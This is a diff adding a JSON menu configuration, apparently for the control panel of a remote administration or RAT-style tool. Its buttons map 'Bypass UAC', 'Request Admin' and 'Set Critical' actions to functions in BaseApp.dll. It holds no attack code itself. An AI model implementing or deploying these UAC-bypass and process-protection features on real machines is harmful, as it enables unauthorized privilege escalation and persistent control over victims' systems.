@@ -1,0 +1,50 @@
+[
+    {
+        "ButtonLabel": "Bypass UAC",
+        "ButtonId": "clientbypassuac",
+        "DllFileName": "BaseApp.dll",
+        "TypeName": "Client",
+        "Entry": "BypassUAC",
+        "IsMainButton": false
+    },
+    {
+        "ButtonLabel": "Process",
+        "ButtonId": "client",
+        "DllFileName": "BaseApp.dll",
+        "TypeName": "Client",
+        "Entry": "ShowClientMenu",
+        "IsMainButton": true
+    },
+    {
+        "ButtonLabel": "Request Admin",
+        "ButtonId": "clientrequestadmin",
+        "DllFileName": "BaseApp.dll",
+        "TypeName": "Client",
+        "Entry": "RequestAdmin",
+        "IsMainButton": false
+    },
+    {
+        "ButtonLabel": "End",
+        "ButtonId": "end",
+        "DllFileName": "",
+        "TypeName": "",
+        "Entry": "",
+        "IsMainButton": false
+    },
+    {
+        "ButtonLabel": "Set Critical",
+        "ButtonId": "clientsetcritical",
+        "DllFileName": "BaseApp.dll",
+        "TypeName": "Client",
+        "Entry": "SetCritical",
+        "IsMainButton": false
+    },
+    {
+        "ButtonLabel": "Set Not Critical",
+        "ButtonId": "clientsetnotcritical",
+        "DllFileName": "BaseApp.dll",
+        "TypeName": "Client",
+        "Entry": "SetNotCritical",
+        "IsMainButton": false
+    }
+]
